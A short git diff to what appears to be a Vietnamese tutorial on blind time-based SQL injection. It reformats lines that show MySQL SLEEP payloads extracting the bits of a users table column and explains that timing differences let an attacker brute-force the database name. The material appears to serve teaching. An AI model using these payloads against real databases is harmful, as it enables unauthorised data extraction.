@@ -23,10 +23,12 @@ group_concat(database_name) lấy tất cả record của Field database_name t�
 			SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 6 & 1) * 3)
 			SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 5 & 1) * 3)
 			SLEEP((SELECT ASCII(substr((SELECT user FROM db_m3149.users), 1, 1)) >> 0 & 1) * 3)
+			
+			97 >> 6  & 1 == 1 ==> SLEEP(3)
+			97 >> 5  & 1 == 1 ==> SLEEP(3)
+			97 >> 0  & 1 == 1 ==> SLEEP(3)
 	```
-		97 >> 6  & 1 == 1 ==> SLEEP(3)
-		97 >> 5  & 1 == 1 ==> SLEEP(3)
-		97 >> 0  & 1 == 1 ==> SLEEP(3)
+		
 
 - Vậy chỉ cần dựa vào thời gian delay giữa các cặp gói tin request/response attacker có thể dễ dàng bruteforce được database_name.
 - Ta tiếp tục xét đoạn mysql sau:
